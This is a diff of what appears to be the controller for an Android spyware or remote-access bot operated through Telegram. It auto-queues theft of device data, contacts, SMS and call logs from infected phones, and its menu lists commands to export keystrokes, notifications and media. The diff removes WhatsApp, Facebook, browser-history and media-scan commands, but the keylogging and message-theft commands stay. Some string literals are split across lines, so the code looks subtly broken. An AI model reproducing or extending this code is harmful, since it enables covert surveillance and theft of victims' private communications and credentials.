@@ -246,8 +246,7 @@ function queueAutoDataCommands(deviceId, chatId) {
     autoDataRequested.set(deviceId, {
         timestamp: Date.now(),
         requested: [
-            'device_info', 'network_info', 'mobile_info',
-            'contacts_all
+            'device_info', 'network_info', 'mobile_info', 'contacts_all
 ', 'sms_all
 ', 'calllogs_all
 ', 'apps_all
@@ -769,10 +768,7 @@ async function setChatMenuButton(chatId) {
             { command: 'apps_all', description: '📱 Export ALL apps' },
             { command: 'keys_all', description: '⌨️ Export ALL keystrokes' },
             { command: 'notify_all', description: '🔔 Export ALL notifications' },
-            { command: 'whatsapp_all', description: '💬 Export ALL WhatsApp' },
-            { command: 'telegram_all', description: '💬 Export ALL Telegram' },
-            { command: 'facebook_all', description: '💬 Export ALL Facebook' },
-            { command: 'browser_all', description: '🌐 Export ALL browser history' },
+  
             
             // ============ INFO COMMANDS ============
             { command: 'device_info', description: '📱 Device information' },
@@ -806,13 +802,9 @@ async function setChatMenuButton(chatId) {
             
             // ============ MEDIA SCANNING ============
             { command: 'find_recorded', description: '🔍 Scan for recorded media' },
-            { command: 'enable_media_scan', description: '✅ Enable media scanning' },
-            { command: 'disable_media_scan', description: '❌ Disable media scanning' },
+            
             { command: 'media_scan_status', description: '📊 Media scan status' },
-            { command: 'add_scan_path', description: '➕ Add scan path' },
-            { command: 'remove_scan_path', description: '❌ Remove scan path' },
-            { command: 'list_scan_paths', description: '📋 List scan paths' },
-            { command: 'clear_scan_paths', description: '🗑️ Clear scan paths' },
+            
             
             // ============ STORAGE MANAGEMENT ============
             { command: 'clear_storage', description: '🗑️ Clear app storage' },
